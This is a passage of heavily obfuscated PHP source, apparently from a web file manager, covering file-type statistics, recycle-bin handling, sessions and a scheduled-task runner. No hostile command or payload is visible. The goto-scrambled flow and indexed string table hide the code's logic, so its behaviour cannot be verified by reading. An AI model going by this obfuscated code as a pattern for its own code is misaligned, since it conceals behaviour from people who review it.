: $Dô¬§Ô¶Ü; return $Dô¬§Ô¶Ü; goto bºªîÊ•; e“Ğ·Ù÷§: $A¦µì¹¾‰£ = array_to_keyvalue($A¦µì¹¾‰£, $cÇî†¦Ä×Û[33], $cÇî†¦Ä×Û[397]); $A¦µì¹¾‰£ = array_unique(array_filter($A¦µì¹¾‰£)); if ($A¦µì¹¾‰£) { $b†ƒù‹Ì‹ = array($cÇî†¦Ä×Û[412] => array($cÇî†¦Ä×Û[413], $A¦µì¹¾‰£)); $Dô¬§Ô¶Ü += floatval($this->where($b†ƒù‹Ì‹)->sum($cÇî†¦Ä×Û[78])); } goto EÎÆë§”³Í; Cô¿³Äé¿: $Dô¬§Ô¶Ü = floatval($dùÖÖ…ˆ•ª[$cÇî†¦Ä×Û[78]]); $b†ƒù‹Ì‹ = array($cÇî†¦Ä×Û[579] => array($cÇî†¦Ä×Û[539], $cÇî†¦Ä×Û[526] . $dùÖÖ…ˆ•ª[$cÇî†¦Ä×Û[397]] . $cÇî†¦Ä×Û[540])); $A¦µì¹¾‰£ = Model($cÇî†¦Ä×Û[423])->field($cÇî†¦Ä×Û[412])->where($b†ƒù‹Ì‹)->select(); goto e“Ğ·Ù÷§; bºªîÊ•: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($C—„¤—ª¹) { return $this->fileTypeProfile($C—„¤—ª¹, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Aá—ÔŠ·ÃŞ) { return $this->fileTypeProfile($Aá—ÔŠ·ÃŞ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($d†êŞ Áë¾, $EËËº£Œ¿¹) { goto C‘ˆÙœ¥ª; C‘ˆÙœ¥ª: $cÑ—Äğ ô =& $_SERVER[Ö‘Øù]; $CÅˆÇŞìİ = $cÑ—Äğ ô[2023] . $d†êŞ Áë¾ . $cÑ—Äğ ô[71] . $EËËº£Œ¿¹; $dÙ½Øåî‚ = Cache::get($CÅˆÇŞìİ); goto EÒÁ–èÍ“½; Eç¢æèÃÈ: foreach ($aóîÌ†ÛÓ© as $FİŠöË›˜á => $Fš»àÒÂ–) { $bïŒ‚Ì˜[$cÑ—Äğ ô[407]] = $this->fileTypeWhere($FİŠöË›˜á); $D¹Ä·÷ŠËŒ[$FİŠöË›˜á] = array($cÑ—Äğ ô[2025] => $Fš»àÒÂ–[$cÑ—Äğ ô[28]], $cÑ—Äğ ô[2026] => $this->where($bïŒ‚Ì˜)->count(), $cÑ—Äğ ô[574] => $this->where($bïŒ‚Ì˜)->sum($cÑ—Äğ ô[78])); } Cache::set($CÅˆÇŞìİ, $D¹Ä·÷ŠËŒ, 1200); return $D¹Ä·÷ŠËŒ; goto EÄœê˜¿ß‘; b¦«ÍŠæÃ: $D¹Ä·÷ŠËŒ = array(); $D¹Ä·÷ŠËŒ[$cÑ—Äğ ô[2024]] = array($cÑ—Äğ ô[2025] => LNG($cÑ—Äğ ô[2024]), $cÑ—Äğ ô[2026] => $this->where($bïŒ‚Ì˜)->count(), $cÑ—Äğ ô[574] => $this->where($bïŒ‚Ì˜)->sum($cÑ—Äğ ô[78])); $aóîÌ†ÛÓ© = KodIO::fileTypeList(); goto Eç¢æèÃÈ; EÒÁ–èÍ“½: if ($dÙ½Øåî‚) { return $dÙ½Øåî‚; } $bïŒ‚Ì˜ = array($cÑ—Äğ ô[572] => 0); if ($d†êŞ Áë¾ != !1) { $bïŒ‚Ì˜[$cÑ—Äğ ô[499]] = $d†êŞ Áë¾; $bïŒ‚Ì˜[$cÑ—Äğ ô[406]] = $EËËº£Œ¿¹; } goto b¦«ÍŠæÃ; EÄœê˜¿ß‘: } public function fileNameExist($aÈ…Õ¤Øå, $Aòø™Šª) { $CÇó¹ŸÈ¹Š =& $_SERVER[Ö‘Øù]; $bÀ­¯Ë­º = $this->where(array($CÇó¹ŸÈ¹Š[493] => $aÈ…Õ¤Øå, $CÇó¹ŸÈ¹Š[28] => $Aòø™Šª, $CÇó¹ŸÈ¹Š[425] => 0))->find(); return is_array($bÀ­¯Ë­º) ? $bÀ­¯Ë­º[$CÇó¹ŸÈ¹Š[397]] : !1; } public function childList($Bçğ¸ÖëÃ½) { goto Cáô”ÀĞ¾; eÂĞœÌÙˆä: self::$cacheChildList[$cœèèºÙæ] = $fç¿¸™øÚ; foreach ($fç¿¸™øÚ as $A÷´«¼á‰…) { $cœèèºÙæ = $DÚ‘‘»èµ÷[453] . $A÷´«¼á‰…[$DÚ‘‘»èµ÷[397]]; self::$cacheSourceInfo[$cœèèºÙæ] = $A÷´«¼á‰…; } return $fç¿¸™øÚ; goto a÷ÓôÁ‡¥Æ; Cáô”ÀĞ¾: $DÚ‘‘»èµ÷ =& $_SERVER[Ö‘Øù]; $cœèèºÙæ = $DÚ‘‘»èµ÷[2001] . $Bçğ¸ÖëÃ½; if (isset(self::$cacheChildList[$cœèèºÙæ])) { return self::$cacheChildList[$cœèèºÙæ]; } goto céÛï´£•©; céÛï´£•©: $f³‡ŞÙÁÏ = array($DÚ‘‘»èµ÷[493] => intval($Bçğ¸ÖëÃ½), $DÚ‘‘»èµ÷[425] => 0); $fç¿¸™øÚ = $this->where($f³‡ŞÙÁÏ)->select(); $fç¿¸™øÚ = $fç¿¸™øÚ ? $fç¿¸™øÚ : array(); goto eÂĞœÌÙˆä; a÷ÓôÁ‡¥Æ: } public function fileNameAuto($B´äŸßòƒ, $cà÷ÁŸñØÕ, $CÕòÄó˜”Ÿ = REPEAT_RENAME, $AËÒ¾ÓµÅ™ = false) { $Dë½Â£è­ =& $_SERVER[Ö‘Øù]; $F¡ˆëé‘‡Š = array($Dë½Â£è­[493] => $B´äŸßòƒ, $Dë½Â£è­[425] => 0, $Dë½Â£è­[28] => array($Dë½Â£è­[381], $cà÷ÁŸñØÕ . $Dë½Â£è­[382])); $A¯ÌËº¤Ô = $this->field($Dë½Â£è­[28])->where($F¡ˆëé‘‡Š)->select(); $CìÛ…ó‚ò¼ = array_to_keyvalue($A¯ÌËº¤Ô, $Dë½Â£è­[33], $Dë½Â£è­[28]); return $this->fileNameAutoGet($CìÛ…ó‚ò¼, $cà÷ÁŸñØÕ, $CÕòÄó˜”Ÿ, $AËÒ¾ÓµÅ™); } public function fileNameAutoGet($f“ÚÄ¹¤, $eçƒ¶®›, $Fˆ‰ÏÙá«®, $FÑï†ùù) { $cÎõ®Á«† =& $_SERVER[Ö‘Øù]; if ($Fˆ‰ÏÙá«® == REPEAT_REPLACE || !$f“ÚÄ¹¤ || !in_array_not_case($eçƒ¶®›, $f“ÚÄ¹¤) || $FÑï†ùù && $Fˆ‰ÏÙá«® != REPEAT_RENAME_FOLDER) { return $eçƒ¶®›; } if ($Fˆ‰ÏÙá«® == REPEAT_SKIP) { return !1; } $D‡œ–ÑÊİ = $cÎõ®Á«†[95] . get_path_ext($eçƒ¶®›); $D‡œ–ÑÊİ = $D‡œ–ÑÊİ == $cÎõ®Á«†[95] || $FÑï†ùù ? $cÎõ®Á«†[33] : $D‡œ–ÑÊİ; for ($B¦¡˜ƒ¸õò = 1; $B¦¡˜ƒ¸õò <= count($f“ÚÄ¹¤) + 1; $B¦¡˜ƒ¸õò++) { $fõà™°‰„ = substr($eçƒ¶®›, 0, strlen($eçƒ¶®›) - strlen($D‡œ–ÑÊİ)); $BÆ‰¿òˆàâ = $fõà™°‰„ . "\x28{$B¦¡˜ƒ¸õò}\51{$D‡œ–ÑÊİ}"; if (!in_array_not_case($BÆ‰¿òˆàâ, $f“ÚÄ¹¤)) { return $BÆ‰¿òˆàâ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\143\145\137\162\145\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\151\155\145", "\164\151\155\145", "\151\156\163\145\x72\164", "\x66\165\156\143\164\x69\157\x6e")); public function listData($E‘ˆ’´Ø×» = false) { $b¦¨Õñ­‡õ =& $_SERVER[Ö‘Øù]; $E‘ˆ’´Ø×» = $E‘ˆ’´Ø×» ? $E‘ˆ’´Ø×» : USER_ID; $D˜‰º½ƒ†” = $this->where(array($b¦¨Õñ­‡õ[1552] => $E‘ˆ’´Ø×»))->select(); return array_to_keyvalue($D˜‰º½ƒ†”, $b¦¨Õñ­‡õ[33], $b¦¨Õñ­‡õ[397]); } public function moveToRecycle($f¾‡†ò˜•) { goto BÛ‰Ø‘ÄÅ‰; böåà¸ËŒ: $this->recycleMove($f¾‡†ò˜•, 1); if ($D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[405]] == $C•‹ŞĞèÇ[87]) { $a‚±éù¦Ÿ = array($C•‹ŞĞèÇ[579] => array($C•‹ŞĞèÇ[539], $D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[516]] . $f¾‡†ò˜• . $C•‹ŞĞèÇ[540])); $dø©œ½”¶->where($a‚±éù¦Ÿ)->setField($C•‹ŞĞèÇ[425], 1); } goto BÑÛ‘–„“ô; EÕØˆŠ±Ø¹: if (!$D¬¤ºÂÑ«Î || $D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[425]] == $C•‹ŞĞèÇ[87]) { return; } $dÄ“©Ô¸ó = array($C•‹ŞĞèÇ[412] => $f¾‡†ò˜•, $C•‹ŞĞèÇ[1552] => USER_ID, $C•‹ŞĞèÇ[575] => $D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[406]], $C•‹ŞĞèÇ[576] => $D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[499]], $C•‹ŞĞèÇ[579] => $D¬¤ºÂÑ«Î[$C•‹ŞĞèÇ[516]]); $this->add($dÄ“©Ô¸ó); goto böåà¸ËŒ; BÛ‰Ø‘ÄÅ‰: $C•‹ŞĞèÇ =& $_SERVER[Ö‘Øù]; $dø©œ½”¶ = Model($C•‹ŞĞèÇ[1240]); $D¬¤ºÂÑ«Î = $dø©œ½”¶->sourceInfo($f¾‡†ò˜•); goto EÕØˆŠ±Ø¹; BÑÛ‘–„“ô: } public function clear() { $this->remove(!1); } public function remove($dÎ½‹Éƒõ = false, $DÁÒ”Ô·õÄ = false) { goto d‹ÅÜÔæ°; d‹ÅÜÔæ°: $C Î²äóùÖ =& $_SERVER[Ö‘Øù]; $DÁÒ”Ô·õÄ = $DÁÒ”Ô·õÄ ? $DÁÒ”Ô·õÄ : USER_ID; $eÔôÅ‡ãê“ = Model($C Î²äóùÖ[1240]); goto a…ÁÈ‘Ù‘ë; B¿À´µ¸‰È: foreach ($e²­¼Áô§ as $Dö²Œ ‹¦) { if ($dÎ½‹Éƒõ != !1 && !in_array($Dö²Œ ‹¦, $dÎ½‹Éƒõ)) { continue; } $b¤«á‚§áÇ = $eÔôÅ‡ãê“->sourceInfo($Dö²Œ ‹¦); $eÔôÅ‡ãê“->remove($Dö²Œ ‹¦, !1); $F½ßª¾‚Ğ¨ = $b¤«á‚§áÇ[$C Î²äóùÖ[406]] . $C Î²äóùÖ[71] . $b¤«á‚§áÇ[$C Î²äóùÖ[499]]; $D˜ãáùÜ¯‹[$F½ßª¾‚Ğ¨] = array($C Î²äóùÖ[575] => $b¤«á‚§áÇ[$C Î²äóùÖ[406]], $C Î²äóùÖ[499] => $b¤«á‚§áÇ[$C Î²äóùÖ[499]]); $this->where(array($C Î²äóùÖ[397] => $Dö²Œ ‹¦))->delete(); } foreach ($D˜ãáùÜ¯‹ as $d¼ƒ¾ÏŒ) { $eÔôÅ‡ãê“->targetSpaceUpdate($d¼ƒ¾ÏŒ[$C Î²äóùÖ[406]], $d¼ƒ¾ÏŒ[$C Î²äóùÖ[499]]); } goto cƒÀ£… ğñ; a…ÁÈ‘Ù‘ë: $e²­¼Áô§ = $this->listData($DÁÒ”Ô·õÄ); $dÎ½‹Éƒõ = $dÎ½‹Éƒõ === !1 ? !1 : $dÎ½‹Éƒõ; $D˜ãáùÜ¯‹ = array(); goto B¿À´µ¸‰È; cƒÀ£… ğñ: } public function restore($c…²›ÚĞ›‚ = false) { $DÑòòÂÏ¼„ = $this->listData(); $this->_restoreSource($DÑòòÂÏ¼„, $c…²›ÚĞ›‚); } public function removeUserAll($cğäåØäô) { $this->remove(!1, $cğäåØäô); } private function _restoreSource($aêó¢çŒ‡Ï, $bñŸ‡êãÕÙ) { goto DªğÜ‹‹Ò”; DªğÜ‹‹Ò”: $bÕ¯Ï½óÉô =& $_SERVER[Ö‘Øù]; $A®”®êÔ‚¬ = Model($bÕ¯Ï½óÉô[1240]); $bñŸ‡êãÕÙ = $bñŸ‡êãÕÙ == !1 ? !1 : $bñŸ‡êãÕÙ; goto B¾‹‡î¤¾¨; B¾‹‡î¤¾¨: if (!$aêó¢çŒ‡Ï) { return !0; } $A×İšÙ‡ƒ„ = array(); foreach ($aêó¢çŒ‡Ï as $c»ÇÃçÙ±ñ) { goto aÄ…¯Óª Œ; aÄ…¯Óª Œ: if ($bñŸ‡êãÕÙ != !1 && !in_array($c»ÇÃçÙ±ñ, $bñŸ‡êãÕÙ)) { continue; } $dŒ†áÖÙ¶ = $A®”®êÔ‚¬->sourceInfo($c»ÇÃçÙ±ñ); $BøÆ¦Ù¬¯Ô = $A®”®êÔ‚¬->sourceInfo($dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[493]]); goto EğÇÀÖÁÓ; B–ğÀÃŠ¼: $A×İšÙ‡ƒ„[] = $dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[493]]; if ($dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[405]] == $bÕ¯Ï½óÉô[87]) { $A×İšÙ‡ƒ„[] = $c»ÇÃçÙ±ñ; } $A®”®êÔ‚¬->lockMoveEnd($c»ÇÃçÙ±ñ); goto BÀïóÛÉ·“; EğÇÀÖÁÓ: if ($BøÆ¦Ù¬¯Ô[$bÕ¯Ï½óÉô[425]] == $bÕ¯Ï½óÉô[87]) { continue; } $A®”®êÔ‚¬->lockMoveStart($c»ÇÃçÙ±ñ); $this->recycleMove($c»ÇÃçÙ±ñ, 0); goto BÜêšê“—; BÜêšê“—: if ($dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[405]] == $bÕ¯Ï½óÉô[87]) { $b¿“°®É Ê = array($bÕ¯Ï½óÉô[579] => array($bÕ¯Ï½óÉô[539], $dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[516]] . $c»ÇÃçÙ±ñ . $bÕ¯Ï½óÉô[540])); $A®”®êÔ‚¬->where($b¿“°®É Ê)->setField($bÕ¯Ï½óÉô[425], 0); $this->restoreFolderChildren($c»ÇÃçÙ±ñ, $aêó¢çŒ‡Ï); } $this->where(array($bÕ¯Ï½óÉô[397] => $c»ÇÃçÙ±ñ))->delete(); $A®”®êÔ‚¬->folderSizeReset($dŒ†áÖÙ¶[$bÕ¯Ï½óÉô[493]]); goto B–ğÀÃŠ¼; BÀïóÛÉ·“: } goto Bãàœî–˜; Bãàœî–˜: $A®”®êÔ‚¬->updateModifyTime($A×İšÙ‡ƒ„); goto E î¡•¨Â”; E î¡•¨Â”: } private function restoreFolderChildren($c»àœÛÙã, $E†çæ¨·¥å) { goto e´ùùÔŞ„Š; e´ùùÔŞ„Š: $C²èê¿¥çÍ =& $_SERVER[Ö‘Øù]; $dñÒÓä÷â = Model($C²èê¿¥çÍ[1240]); $A›¥¸¯ˆ = array($C²èê¿¥çÍ[397] => array($C²èê¿¥çÍ[7], array())); goto E‚†îš¿·; E‚†îš¿·: foreach ($E†çæ¨·¥å as $a‰¡ø„øí) { if ($a‰¡ø„øí == $c»àœÛÙã) { continue; } if (!$dñÒÓä÷â->isParentOf($c»àœÛÙã, $a‰¡ø„øí)) { continue; } $D‚êÔøˆ•’ = $dñÒÓä÷â->sourceInfo($a‰¡ø„øí); if ($D‚êÔøˆ•’[$C²èê¿¥çÍ[405]] == $C²èê¿¥çÍ[87]) { $A›¥¸¯ˆ[] = array($C²èê¿¥çÍ[579] => array($C²èê¿¥çÍ[539], $D‚êÔøˆ•’[$C²èê¿¥çÍ[516]] . $a‰¡ø„øí . $C²èê¿¥çÍ[540])); } else { $A›¥¸¯ˆ[$C²èê¿¥çÍ[397]][1][] = $a‰¡ø„øí; } } if (!$A›¥¸¯ˆ[$C²èê¿¥çÍ[397]][1]) { unset($A›¥¸¯ˆ[$C²èê¿¥çÍ[397]]); } if (!$A›¥¸¯ˆ) { return; } goto A¦„äÏ…‰; A¦„äÏ…‰: $A›¥¸¯ˆ[$C²èê¿¥çÍ[397]][1] = array_unique($A›¥¸¯ˆ[$C²èê¿¥çÍ[397]][1]); $A›¥¸¯ˆ[$C²èê¿¥çÍ[993]] = $C²èê¿¥çÍ[1822]; $dñÒÓä÷â->where($A›¥¸¯ˆ)->setField($C²èê¿¥çÍ[425], 1); goto f ÃØ£‹ŞÏ; f ÃØ£‹ŞÏ: } private function recycleMove($eã’õø•È, $B¾ÛæÎß¸… = 1) { $c…’Æµ‚Á =& $_SERVER[Ö‘Øù]; $eáÑ„å–ã = Model($c…’Æµ‚Á[1240]); $d˜«‹‹¹‘¯ = Model($c…’Æµ‚Á[2027]); $EÙŒ°Ö»±ß = array($c…’Æµ‚Á[397] => $eã’õø•È); if ($B¾ÛæÎß¸…) { $eáÑ„å–ã->where($EÙŒ°Ö»±ß)->setField($c…’Æµ‚Á[425], 1); $d˜«‹‹¹‘¯->eventRecycle($eã’õø•È, $c…’Æµ‚Á[2028]); } else { $f÷£ÈÜ™ó = $eáÑ„å–ã->where($EÙŒ°Ö»±ß)->find(); $fªˆ‹æœ… = $f÷£ÈÜ™ó[$c…’Æµ‚Á[405]] == $c…’Æµ‚Á[87]; $B¨ª¥íô = $eáÑ„å–ã->fileNameAuto($f÷£ÈÜ™ó[$c…’Æµ‚Á[493]], $f÷£ÈÜ™ó[$c…’Æµ‚Á[28]], REPEAT_RENAME_FOLDER, $fªˆ‹æœ…); if ($B¨ª¥íô != $f÷£ÈÜ™ó[$c…’Æµ‚Á[28]]) { $eáÑ„å–ã->rename($eã’õø•È, $B¨ª¥íô); } $eáÑ„å–ã->where($EÙŒ°Ö»±ß)->setField($c…’Æµ‚Á[425], 0); $d˜«‹‹¹‘¯->eventRecycle($eã’õø•È, $c…’Æµ‚Á[2029]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x73\x6f\x75\x72\x63\145\x53\145\143\x72\x65\x74\x4c\x69\x73\164"; public $field = array("\x73\x6f\x75\x72\x63\145\x49\x44", "\164\x79\x70\x65\111\x44", "\143\162\145\x61\164\x65\125\163\x65\162"); } goto B¶Ú£«ÈŸ; b„ê†“„ãó: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aäŸ×îí‚Ñ; aêˆíî§ŠŸ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C¼İ¼œÔ¾© = new self(); return $C¼İ¼œÔ¾©; goto cğÉØ—ˆ„¿; aäŸ×îí‚Ñ: $FÛ÷Ï˜˜Î‘ =& $_SERVER[Ö‘Øù]; static $C¼İ¼œÔ¾© = false; if ($C¼İ¼œÔ¾©) { return $C¼İ¼œÔ¾©; } goto EˆÛôë‡Ó; EˆÛôë‡Ó: $a¨‰†Û = $GLOBALS[$FÛ÷Ï˜˜Î‘[6]][$FÛ÷Ï˜˜Î‘[347]]; self::$sessionTime = $a¨‰†Û[$FÛ÷Ï˜˜Î‘[1520]]; $dİÄÇß‚×­ = isset($GLOBALS[$FÛ÷Ï˜˜Î‘[1521]]) ? $GLOBALS[$FÛ÷Ï˜˜Î‘[1521]] : SESSION_ID; goto a¨¢†Éˆ†è; EŞ’ØÊŞ°¼: $d§îé—ìá = $a¨‰†Û[$FË¾ºìÛ‰]; $F˜øŒËŠ¬§ = $a¨‰†Û[$FÛ÷Ï˜˜Î‘[828]]; switch ($FË¾ºìÛ‰) { case $FÛ÷Ï˜˜Î‘[17]: self::$handle = Model($FÛ÷Ï˜˜Î‘[829]); break; case $FÛ÷Ï˜˜Î‘[830]: self::$handle = new CacheRedis($d§îé—ìá, $F˜øŒËŠ¬§); break; case $FÛ÷Ï˜˜Î‘[831]: self::$handle = new CacheMemcached($d§îé—ìá, $F˜øŒËŠ¬§); break; case $FÛ÷Ï˜˜Î‘[193]: $d§îé—ìá[$FÛ÷Ï˜˜Î‘[76]] = $d§îé—ìá[$FÛ÷Ï˜˜Î‘[76]] . $FÛ÷Ï˜˜Î‘[1523]; self::$handle = new CacheFile($d§îé—ìá, $F˜øŒËŠ¬§); default: break; } goto aêˆíî§ŠŸ; a¨¢†Éˆ†è: if (self::$sessionSign) { } else { if (Cookie::get($dİÄÇß‚×­)) { self::$sessionSign = Cookie::get($dİÄÇß‚×­); } else { self::$sessionSign = guid(); } } Cookie::setSafe($dİÄÇß‚×­, self::$sessionSign, self::$sessionTime); $FË¾ºìÛ‰ = $a¨‰†Û[$FÛ÷Ï˜˜Î‘[1522]]; goto EŞ’ØÊŞ°¼; cğÉØ—ˆ„¿: } public static function sign($a¢ÚŸàÊ‰ç = false) { $a¢ÚŸàÊ‰ç && (self::$sessionSign = $a¢ÚŸàÊ‰ç); self::init(); return self::$sessionSign; } public static function set($Dî±Õ½àÊÙ, $f´–Ú¸Ãö‚ = false) { self::init(); if (is_array($Dî±Õ½àÊÙ)) { foreach ($Dî±Õ½àÊÙ as $C¿®ÊŞáøË => $DÃÍÃÆ³Ğ) { array_set_value(self::$data, $C¿®ÊŞáøË, $DÃÍÃÆ³Ğ); } } else { array_set_value(self::$data, $Dî±Õ½àÊÙ, $f´–Ú¸Ãö‚); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cİ¤àÒ¸ÁŒ = false) { self::init(); if (!$cİ¤àÒ¸ÁŒ) { return self::$data; } return array_get_value(self::$data, $cİ¤àÒ¸ÁŒ); } public static function remove($c†Í­íÜö) { self::init(); unset(self::$data[$c†Í­íÜö]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ö‘Øù][833])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto D÷Í»İ¿»; fØöâõ–: while (!0) { self::cacheClear(); if (self::valueGet($dîë¦‡©ù„[743]) != $dîë¦‡©ù„[87]) { self::valueSet($dîë¦‡©ù„[1524], $dîë¦‡©ù„[191]); self::log($dîë¦‡©ù„[1528]); die; } self::valueSet($dîë¦‡©ù„[1524], $dîë¦‡©ù„[87]); self::valueSet($dîë¦‡©ù„[1525], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto cùÙù¹™ªí; D…Ùé‘é…‰: http_close(); self::valueSet($dîë¦‡©ù„[1524], $dîë¦‡©ù„[87]); Hook::bind($dîë¦‡©ù„[1526], $dîë¦‡©ù„[1527]); goto fØöâõ–; D÷Í»İ¿»: $dîë¦‡©ù„ =& $_SERVER[Ö‘Øù]; if (self::valueGet($dîë¦‡©ù„[743]) != $dîë¦‡©ù„[87]) { return; } if (self::valueGet($dîë¦‡©ù„[1524]) == $dîë¦‡©ù„[87]) { $cÃ×õ³ë¾‘ = self::valueGet($dîë¦‡©ù„[1525]); if (time() - $cÃ×õ³ë¾‘ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto D…Ùé‘é…‰; cùÙù¹™ªí: } public static function restart() { $bÎÌ¦—–× =& $_SERVER[Ö‘Øù]; http_close(); self::valueSet($bÎÌ¦—–×[743], $bÎÌ¦—–×[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($bÎÌ¦—–×[1524], $bÎÌ¦—–×[191]); self::valueSet($bÎÌ¦—–×[743], $bÎÌ¦—–×[87]); } public static function shutdownEvent() { $Cí¬à´­ò =& $_SERVER[Ö‘Øù]; self::valueSet($Cí¬à´­ò[1524], $Cí¬à´­ò[191]); self::log($Cí¬à´­ò[1529]); } public static function config($CÍ«²Ïã‹, $fÚŠ¿¯ˆôª) { self::valueSet($_SERVER[Ö‘Øù][743], $CÍ«²Ïã‹); } private static function taskRunAll() { goto f°“¨áÁ™©; f°“¨áÁ™©: $E‰º‘”ÆœÊ =& $_SERVER[Ö‘Øù]; $bÂ¸–†•¾î = timeFloat(); $AáÃÜ±½»„ = Model($E‰º‘”ÆœÊ[1530])->listData(); goto Eíø³²ºÑ; a®‚¸ù³ì: self::taskQueueRun($bÂ¸–†•¾î); goto f¶±ó‘ÔÍ; Eíø³²ºÑ: $cĞ½ãÂ¾Ë¯ = count($AáÃÜ±½»„); for ($CÙˆÌÕàõÔ = 0; $CÙˆÌÕàõÔ < $cĞ½ãÂ¾Ë¯; $CÙˆÌÕàõÔ++) { $F”ñ‰ÉÉ‚¡ = $AáÃÜ±½»„[$CÙˆÌÕàõÔ]; if (!$F”ñ‰ÉÉ‚¡[$E‰º‘”ÆœÊ[395]] || $F”ñ‰ÉÉ‚¡[$E‰º‘”ÆœÊ[1531]] != $E‰º‘”ÆœÊ[87]) { continue; } if (!self::taskTimeCheck($F”ñ‰ÉÉ‚¡)) { continue; } self::taskRun($F”ñ‰ÉÉ‚¡); } Hook::trigger($E‰º‘”ÆœÊ[1532]); goto a®‚¸ù³ì; f¶±ó‘ÔÍ: } private static function taskQueueRun($eòìâ‚ÑäÎ) { $CªÔÜÈƒ§™ = 10; while (!0) { $d¸Òº‰Ûéª = TaskQueue::run(); if ($d¸Òº‰Ûéª === !1) { break; } if (timeFloat() - $eòìâ‚ÑäÎ >= $CªÔÜÈƒ§™) { break; } } } private static function taskTimeCheck($D¶Ï×æÙ›) { goto DÇªÅîóÌ¥; b¤‹¦–ŸƒÈ: $bÁÓ“¤¾æ = strtotime($BØŸØÙÒ¨[1533] . $d›¤‘‡¢ğ[$BØŸØÙÒ¨[1534]] . $BØŸØÙÒ¨[1535]) - strtotime($BØŸØÙÒ¨[1536]); $e¿µÚÎšô˜ = time() - strtotime(date($BØŸØÙÒ¨[1537]) . $BØŸØÙÒ¨[1538]); $dÊ‹ˆìæ³ˆ = $e¿µÚÎšô˜ >= $bÁÓ“¤¾æ && $e¿µÚÎšô˜ <= $bÁÓ“¤¾æ + 3600; goto f‰İƒÃ•Ñ¿; f‰İƒÃ•Ñ¿: switch ($d›¤‘‡¢ğ[$BØŸØÙÒ¨[29]]) { case $BØŸØÙÒ¨[1539]: if (time() - $d£ïè‰÷ëğ < 3600 * 24 * 30) { return !1; } if ($d›¤‘‡¢ğ[$BØŸØÙÒ¨[1539]] == date($BØŸØÙÒ¨[1540]) && $dÊ‹ˆìæ³ˆ) { return !0; } break; case $BØŸØÙÒ¨[1541]: if (time() - $d£ïè‰÷ëğ < 3600 * 24 * 7) { return !1; } $DäÔßõÍá¤ = date($BØŸØÙÒ¨[1542]) == 0 ? 7 : date($BØŸØÙÒ¨[1542]); if ($d›¤‘‡¢ğ[$BØŸØÙÒ¨[1541]] == $DäÔßõÍá¤ && $dÊ‹ˆìæ³ˆ) { return !0; } break; case $BØŸØÙÒ¨[1534]: if (time() - $d£ïè‰÷ëğ < 3600 * 24) { return !1; } if ($dÊ‹ˆìæ³ˆ) { return !0; } break; case $BØŸØÙÒ¨[1543]: if (time() - $d£ïè‰÷ëğ >= floatval($d›¤‘‡¢ğ[$BØŸØÙÒ¨[1543]]) * 60) { return !0; } break; default: break; } return !1; goto Eªë¡ù§ø‰; DÇªÅîóÌ¥: $BØŸØÙÒ¨ =& $_SERVER[Ö‘Øù]; $d›¤‘‡¢ğ = json_decode($D¶Ï×æÙ›[$BØŸØÙÒ¨[197]], !0); $d£ïè‰÷ëğ = intval($D¶Ï×æÙ›[$BØŸØÙÒ¨[1525]]); goto b¤‹¦–ŸƒÈ; Eªë¡ù§ø‰: } private static function closeDatabase() { goto F”¹‹¡é†×; F”¹‹¡é†×: $bÌ·¨†Ì“Š =& $_SERVER[Ö‘Øù]; static $A¡Ù”¤¢‡— = 0; $bµôå¹ˆá = 300; goto dê‚±Ã…îÁ; a‘‚ğôÌ†’: $bƒŠ†Ö»Š = Model($bÌ·¨†Ì“Š[508])->db($bÌ·¨†Ì“Š[33]); if ($bƒŠ†Ö»Š) { $bƒŠ†Ö»Š->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($bÌ·¨†Ì“Š[1544], $bÌ·¨†Ì“Š[1545]); die; } goto D Çëš¦Ø; dê‚±Ã…îÁ: if (!$A¡Ù”¤¢‡—) { $A¡Ù”¤¢‡— = time(); } if (time() - $A¡Ù”¤¢‡— < $bµôå¹ˆá) { return; } $A¡Ù”¤¢‡— = time(); goto a‘‚ğôÌ†’; D Çëš¦Ø: } public static function taskRun($c˜àƒÂêÇØ) { goto D£‰›ÉØ÷š; Aø²¦È…ò¡: $fØŒ§İÍ£ù = timeFloat(); $aæ—¾åÑĞ = $b‘ŸòÑª¢î[33]; switch ($c˜àƒÂêÇØ[$b‘ŸòÑª¢î[29]]) { case $b‘ŸòÑª¢î[305]: $cœ«Õ´“Ìò = url_request($c˜àƒÂêÇØ[$b‘ŸòÑª¢î[1549]], $b‘ŸòÑª¢î[228], !1, !1, !1, !1, 10); if ($cœ«Õ´“Ìò[$b‘ŸòÑª¢î[743]]) { $aæ—¾åÑĞ = strlen($cœ«Õ´“Ìò[$b‘ŸòÑª¢î[1122]]); } break; case $b‘ŸòÑª¢î[227]: 